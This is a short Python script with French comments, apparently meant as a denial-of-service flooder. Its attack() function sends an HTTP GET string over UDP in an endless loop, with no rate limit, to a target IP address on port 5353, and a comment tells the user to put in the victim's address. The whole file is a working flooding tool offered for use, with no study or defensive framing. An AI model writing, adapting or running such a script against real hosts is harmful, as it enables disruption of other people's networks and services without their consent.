import socket

target_ip = '192.168.1.40'  # Remplace par l'IP cible
target_port = 5353  # Port cible
message = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode('utf-8') + b'\r\n\r\n'

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        s.sendto(message, (target_ip, target_port))

if __name__ == "__main__":
    attack()